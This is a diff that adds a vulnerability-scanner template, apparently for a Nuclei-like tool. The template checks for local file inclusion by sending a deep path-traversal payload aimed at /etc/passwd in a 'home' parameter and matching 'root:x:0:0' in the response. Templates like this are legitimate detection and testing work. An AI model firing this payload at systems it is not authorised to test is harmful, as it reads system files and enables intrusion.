@@ -1,0 +1,20 @@
+id: lfi7-466
+name: 'Deep traversal in home'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via home'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      home:
+        - '../../../../../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
